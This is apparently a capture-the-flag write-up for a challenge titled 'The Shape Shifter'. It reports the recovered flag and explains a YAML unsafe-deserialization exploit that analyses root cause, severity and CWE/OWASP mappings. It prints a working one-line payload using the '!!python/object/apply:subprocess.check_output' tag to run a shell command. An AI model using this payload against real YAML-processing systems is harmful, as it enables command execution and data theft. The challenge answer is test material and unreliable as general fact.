# Tier 3 — Expert Track, Level 6: The Shape Shifter

**Result: PASSED.** The supplied screenshot shows successful YAML processing and the returned bytes value `b'flag-b1cff7'`, followed by “MISSION ACCOMPLISHED” and “FLAG ACQUIRED.”

## 1. Result
The flag shown in the screenshot is `flag-b1cff7`. This is the value visible in the supplied run; it should not be assumed to be universal across sessions.

## 2. Exploit
The visible YAML payload was:

```yaml
!!python/object/apply:subprocess.check_output [["cat", "flag.txt"]]
```

The Python-specific YAML tag invokes `subprocess.check_output` with `cat flag.txt`. The returned value is bytes and contains the flag.

## 3. Root cause
The YAML processor accepts unsafe Python-specific object construction/deserialization tags. Instead of treating configuration as inert data, the parser permits input to invoke a callable.

## 4. Impact & severity
**Observed impact:** command execution sufficient to read the challenge flag. **Provisional severity: High to Critical**, depending on process privileges, reachable secrets, and whether the same deserialization path can modify system state.

## 5. Mapping
- **CWE-502:** Deserialization of Untrusted Data — strong mapping.
- **OWASP Top 10 A08:2021 — Software and Data Integrity Failures:** plausible high-level mapping.
CWE-78 may also be relevant to process invocation depending on the implementation details.